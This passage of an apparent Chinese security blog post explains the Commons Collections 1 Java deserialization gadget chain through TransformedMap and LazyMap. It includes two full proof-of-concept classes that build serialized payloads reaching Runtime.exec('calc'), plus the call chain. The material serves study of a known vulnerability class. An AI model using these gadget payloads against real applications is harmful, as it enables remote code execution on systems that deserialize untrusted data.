+<p>后面返回了Annotation类型的所有Methods。接着遍历的它的所有方法,这里经过了一个for循环,var6是获得的Methods,var7接着获取了方法名。然后将返回的方法名put到了memberTypes中,这里比较关键,后面会用上,现在大家就记住memberTypes是一个hashmap对象,里面的key是我们传入的Annotation类型Class的方法名字</p>
+<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20210717212105-d73a794e-e701-1.png"><img src="https://i.loli.net/2021/10/03/BmRQAbZMOkn7irN.png" alt="img"></a></p>
+<p>总结一下这一段就类似于这段代码:</p>
+<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20210717212214-0015588e-e702-1.png"><img src="https://i.loli.net/2021/10/03/kpWfEFgRSwOuCJH.png" alt="img"></a></p>
+<p><strong>var3</strong></p>
+<p><img src="https://i.loli.net/2021/10/03/2NZjG3uq54ezE7R.png" alt="image-20211003202723234"></p>
+<p><img src="https://i.loli.net/2021/10/03/p9oy1RqOhsINuik.png" alt="image-20211003182340452"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">这个方法返回var2.memberTypes,我们的memberTypes是一个hashmap,而且key为&quot;value&quot;</span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>var4</strong>好好讲一下</p>
+<p><img src="https://i.loli.net/2021/10/03/9SdYJzabX8vVqHy.png" alt="image-20211003182421599"></p>
+<p>这里的this.memberValues就是我们传入的 TransformedMap，这是在最开始defaultReadObject时生成的</p>
+<p><img src="https://i.loli.net/2021/10/03/KvJ6sriYOMapldP.png" alt="image-20211003182545543"></p>
+<p>因为 TransformedMap继承了AbstractInputCheckedMapDecorator所以这里使用的就是AbstractInputCheckedMapDecorator中的entrySet,之后使用了一个迭代器，其实获得的是AbstractInputCheckedMapDecorator中的内部类</p>
+<p><img src="https://i.loli.net/2021/10/03/kaAPQfFRM7B43h5.png" alt="image-20211003182752626"></p>
+<p><img src="https://i.loli.net/2021/10/03/D4opIN9BMywuYFE.png" alt="image-20211003182938326"></p>
+<p>在AbstractInputCheckedMapDecorator中有这么几个静态内部类<code>MapEntry</code> 、<code>EntrySetIterator</code>、<code>EntrySet</code></p>
+<p><img src="https://i.loli.net/2021/10/03/ladFSt4RjOpxQcq.png" alt="image-20211003201754680"></p>
+<p><img src="https://i.loli.net/2021/10/03/sed7grb6QycV52p.png" alt="image-20211003201805767"></p>
+<p><img src="https://i.loli.net/2021/10/03/U2mREeGwDygcQTV.png" alt="image-20211003201820507"></p>
+<p><strong>var4</strong>最后得到</p>
+<p><img src="https://i.loli.net/2021/10/03/Yj6Q93HhBTAWkln.png" alt="image-20211003195939161"></p>
+<p>也就是说var4为AbstractInputCheckedMapDecorator的内部类EntrySetIterator</p>
+<p><strong>var5</strong>是调用EntrySetIterator的next方法获得的MapEntry类</p>
+<p><img src="https://i.loli.net/2021/10/03/qF16sgPphGQawdx.png" alt="image-20211003202048585"></p>
+<p>以下就一起说了</p>
+<p><img src="https://i.loli.net/2021/10/03/nYKrjcaxISzoLTe.png" alt="image-20211003202234827"></p>
+<p><strong>var6</strong>获取map的key,这里我们传入一个值为value的key,令var6=”value”</p>
+<p><strong>var7</strong>在<strong>var3</strong>中找键为var6的值,如果在这里没有找到,则返回了null,所以我们需要找一个Annotation类型有方法名和我们传入map的key相同</p>
+<h2 id="java-lang-annotation-Retention"><a href="#java-lang-annotation-Retention" class="headerlink" title="java.lang.annotation.Retention"></a>java.lang.annotation.Retention</h2><p>在该类中有一个value方法</p>
+<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20210717212227-081636ca-e702-1.png"><img src="https://i.loli.net/2021/10/03/OMJgejCkAdNfLm9.png" alt="img"></a></p>
+<p>所以我们map类再传一个</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">innermap.put(&quot;value&quot;, &quot;xxx&quot;);</span><br></pre></td></tr></table></figure>
+
+<p>其实java.lang.annotation.Target也行</p>
+<p>之后就简单了，调用setValue，完成攻击</p>
+<p><img src="https://i.loli.net/2021/10/03/JuQwDaVijEnLrTb.png" alt="image-20211003204009190"></p>
+<p>借用涛涛的图来看一下攻击流程，额好像都用了涛涛好多图</p>
+<p><img src="https://i.loli.net/2021/10/03/65sChad2HeFTMzP.png" alt="img"></p>
+<h2 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">package cc;</span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.util.Map;</span><br><span class="line">import org.apache.commons.collections.Transformer;</span><br><span class="line">import org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line">import org.apache.commons.collections.map.TransformedMap;</span><br><span class="line">import java.lang.reflect.Method;</span><br><span class="line">import java.lang.reflect.Constructor;</span><br><span class="line">import java.lang.annotation.Retention;</span><br><span class="line">import java.io.FileInputStream;</span><br><span class="line">import java.io.FileOutputStream;</span><br><span class="line">import java.io.ObjectInputStream;</span><br><span class="line">import java.io.ObjectOutputStream;</span><br><span class="line"></span><br><span class="line">public class CommonCollections1 &#123;</span><br><span class="line">    public static Object generatePayload() throws Exception &#123;</span><br><span class="line">        Transformer[] transformers = new Transformer[]&#123;</span><br><span class="line">                new ConstantTransformer(Runtime.class),//这里用反射的方法是因为Runtime.getRuntime()没有实现Serializable接⼝,所以这里用的Runtime.class。class类实现了serializable接⼝</span><br><span class="line">                new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, new Class[0]&#125;),//这里的new Class[]&#123;String.class, Class[].class&#125;是说明参数的类型，关于Class[].class和new Class[0]可以看看https://paper.seebug.org/1242/#commonscollections-1</span><br><span class="line">                new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, new Object[0]&#125;),//这里用null是因为getRuntime为静态方法，</span><br><span class="line">                new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        Transformer transformerChain = new ChainedTransformer(transformers);</span><br><span class="line">        Map innermap = new HashMap();</span><br><span class="line">        innermap.put(&quot;value&quot;,&quot;xxx&quot;);</span><br><span class="line">        Map outmap = TransformedMap.decorate(innermap, null, transformerChain);</span><br><span class="line"></span><br><span class="line">        Class cls = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);</span><br><span class="line">        Constructor ctor = cls.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        ctor.setAccessible(true);</span><br><span class="line">        Object instance = ctor.newInstance(Retention.class,outmap);</span><br><span class="line">        return instance;</span><br><span class="line">    &#125;</span><br><span class="line">    public static void main(String[] args) throws Exception&#123;</span><br><span class="line">        payload2File(generatePayload(),&quot;obj&quot;);</span><br><span class="line">        payloadTest(&quot;obj&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void payload2File(Object instance ,String file) throws Exception&#123;</span><br><span class="line">        ObjectOutputStream out  = new ObjectOutputStream(new FileOutputStream(file));</span><br><span class="line">        out.writeObject(instance);</span><br><span class="line">        out.flush();</span><br><span class="line">        out.close();</span><br><span class="line">    &#125;</span><br><span class="line">    public static void payloadTest(String file) throws Exception &#123;</span><br><span class="line">        //读取写入的payload，并进行反序列化</span><br><span class="line">        ObjectInputStream in = new ObjectInputStream(new FileInputStream(file));</span><br><span class="line">        in.readObject();</span><br><span class="line">        in.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="调用链"><a href="#调用链" class="headerlink" title="调用链"></a>调用链</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ObjectInputStream.readObject()</span><br><span class="line">            AnnotationInvocationHandler.readObject()</span><br><span class="line">                MapEntry.setValue()</span><br><span class="line">                    TransformedMap.checkSetValue()</span><br><span class="line">                            ChainedTransformer.transform()</span><br><span class="line">                                ConstantTransformer.transform()</span><br><span class="line">                                InvokerTransformer.transform()</span><br><span class="line">                                    Method.invoke()</span><br><span class="line">                                        Class.getMethod()</span><br><span class="line">                                InvokerTransformer.transform()</span><br><span class="line">                                    Method.invoke()</span><br><span class="line">                                        Runtime.getRuntime()</span><br><span class="line">                                InvokerTransformer.transform()</span><br><span class="line">                                    Method.invoke()</span><br><span class="line">                                        Runtime.exec()</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<p>这里再看cc1另一个方法，使用lazymap，这里可能需要一点动态代理的知识</p>
+<p>推荐的话，可以去看看</p>
+<p><a href="https://www.liaoxuefeng.com/wiki/1252599548343744/1264804593397984">https://www.liaoxuefeng.com/wiki/1252599548343744/1264804593397984</a></p>
+<p><a href="https://blog.csdn.net/yaomingyang/article/details/80981004">https://blog.csdn.net/yaomingyang/article/details/80981004</a></p>
+<p><a href="https://www.zhihu.com/question/20794107">https://www.zhihu.com/question/20794107</a></p>
+<p>而且lazymap这条链子与TransformedMap那条只有前半部分不同</p>
+<h2 id="lazymap"><a href="#lazymap" class="headerlink" title="lazymap"></a>lazymap</h2><p>当看到这里的时候，我还是希望大家，想一想，我们为什么之前是为什么要使用TransformedMap的以助于思考</p>
+<p>LazyMap和TransformedMap类似，都来自于Common-Collections库，并继承 AbstractMapDecorator。 LazyMap的漏洞触发点和TransformedMap唯一的差别是，TransformedMap是在写入元素的时候执 行transform，而LazyMap是在其get方法中执行的 factory.transform 。其实这也好理解，LazyMap 的作用是“懒加载”，在get找不到值的时候，它会调用 factory.transform 方法去获取一个值：</p>
+<p><img src="https://i.loli.net/2021/10/04/JtdZIprcLPOMK83.png"></p>
+<p>这里如何调用到 factory.transfo们rm,if进入的条件是我们传入的map不要有后面传入的key，也就是调用get的时候不要传入参数</p>
+<p>接下来，只需要去寻找到一个readObject方法中调用了此get方法就好了</p>
+<h3 id="AnnotationInvocationHandler-1"><a href="#AnnotationInvocationHandler-1" class="headerlink" title="AnnotationInvocationHandler"></a>AnnotationInvocationHandler</h3><p>sun.reflect.annotation.AnnotationInvocationHandler 的readObject方法中并没有直接调用到 Map的get方法。 所以ysoserial找到了另一条路，AnnotationInvocationHandler类的invoke方法有调用到get：</p>
+<p>这里就涉及到了一点动态代理的知识</p>
+<p>我们可以看到，AnnotationInvocationHandler是继承了InvocationHandler，所以我们可以使用动态代理，调用代理类的invoke方法</p>
+<p><img src="https://i.loli.net/2021/10/04/HzB6KDSOW48gVwy.png" alt="image-20211004181800897"></p>
+<p>AnnotationInvocationHandler类的invoke方法</p>
+<p><img src="https://i.loli.net/2021/10/04/fKwO8SQJxhEc1Uj.png" alt="image-20211004194149881"></p>
+<p>我们的memberValues成员为lazymap对象(memberValues的赋值在构造函数中,且我们可控)。还是和原来一样，因为</p>
+<p><img src="https://i.loli.net/2021/10/04/K9YIZW4LVMDQyJO.png" alt="image-20211004194407719"></p>
+<p>,当我们执行到下面这里的时候,就会触发代理机制,然后进入Invoke方法,从而触发命令执行</p>
+<p><img src="https://i.loli.net/2021/10/04/o28XeiHRAuJ6WLn.png" alt="image-20211004195707791"></p>
+<p>为什么是这里？通过之前分析TransformedMap说的，readObject方法中的memberValues其实是我们传入的lazymap对象，使用动态代理。每次调用lazymap中的方法就会去触发AnnotationInvocationHandler的invoke方法</p>
+<h3 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a>攻击流程</h3><p>借用涛涛的攻击流程图<img src="https://i.loli.net/2021/10/04/wbaEB8VlDTGWoRd.png" alt="img"></p>
+<p>poc</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import java.io.FileInputStream;</span><br><span class="line">import java.io.FileOutputStream;</span><br><span class="line">import java.io.ObjectInputStream;</span><br><span class="line">import java.io.ObjectOutputStream;</span><br><span class="line">import java.lang.annotation.Retention;</span><br><span class="line">import java.lang.reflect.Constructor;</span><br><span class="line">import java.lang.reflect.InvocationHandler;</span><br><span class="line">import java.lang.reflect.Proxy;</span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.util.Map;</span><br><span class="line">import org.apache.commons.collections.Transformer;</span><br><span class="line">import org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line">import org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line">public class CommonCollections12 &#123;</span><br><span class="line">    public static Object generatePayload() throws Exception &#123;</span><br><span class="line">        Transformer[] transformers = new Transformer[] &#123;</span><br><span class="line">                new ConstantTransformer(Runtime.class),</span><br><span class="line">                new InvokerTransformer(&quot;getMethod&quot;, new Class[] &#123; String.class, Class[].class &#125;, new Object[] &#123; &quot;getRuntime&quot;, new Class[0] &#125;),</span><br><span class="line">                new InvokerTransformer(&quot;invoke&quot;, new Class[] &#123; Object.class, Object[].class &#125;, new Object[] &#123; null, new Object[0] &#125;),</span><br><span class="line">                new InvokerTransformer(&quot;exec&quot;, new Class[] &#123; String.class &#125;, new Object[] &#123; &quot;calc&quot; &#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        Transformer transformerChain = new ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        Map innermap = new HashMap();</span><br><span class="line">        innermap.put(&quot;value&quot;, &quot;xxx&quot;);</span><br><span class="line">        Map outmap = LazyMap.decorate(innermap,transformerChain);</span><br><span class="line">        //通过反射获得AnnotationInvocationHandler类对象</span><br><span class="line">        Class cls = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);</span><br><span class="line">        //通过反射获得cls的构造函数</span><br><span class="line">        Constructor ctor = cls.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        //这里需要设置Accessible为true，否则序列化失败</span><br><span class="line">        ctor.setAccessible(true);</span><br><span class="line">        //通过newInstance()方法实例化对象</span><br><span class="line">        InvocationHandler handler = (InvocationHandler)ctor.newInstance(Retention.class, outmap);//使用Retention.class是因为，初始化的时候要求var1 为Class&lt;? extends Annotation&gt;</span><br><span class="line">        Map mapProxy = (Map)Proxy.newProxyInstance(LazyMap.class.getClassLoader(),LazyMap.class.getInterfaces(),handler);</span><br><span class="line">        Object instance = ctor.newInstance(Retention.class, mapProxy);</span><br><span class="line"></span><br><span class="line">        return instance;</span><br><span class="line">    &#125;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        payload2File(generatePayload(),&quot;obj&quot;);</span><br><span class="line">        payloadTest(&quot;obj&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    public static void payload2File(Object instance, String file)</span><br><span class="line">            throws Exception &#123;</span><br><span class="line">        ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(file));</span><br><span class="line">        out.writeObject(instance);</span><br><span class="line">        out.flush();</span><br><span class="line">        out.close();</span><br><span class="line">    &#125;</span><br><span class="line">    public static void payloadTest(String file) throws Exception &#123;</span><br><span class="line">        ObjectInputStream in = new ObjectInputStream(new FileInputStream(file));</span><br><span class="line">        in.readObject();</span><br><span class="line">        in.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+<p><a href="https://xz.aliyun.com/t/9873#toc-19">https://xz.aliyun.com/t/9873#toc-19</a></p>
+<p><a href="https://paper.seebug.org/1242/#commonscollections-1">https://paper.seebug.org/1242/#commonscollections-1</a></p>
+<p>Java安全漫谈 - 10.用TransformedMap编写真正的POC.pdf</p>
+<p>java安全漫谈 - 11.反序列化篇(5).pdf</p>
+]]></content>
+      <categories>
+        <category>java反序列化</category>
+      </categories>
+      <tags>
+        <tag>java反序列化</tag>
       </tags>
   </entry>
 </search>
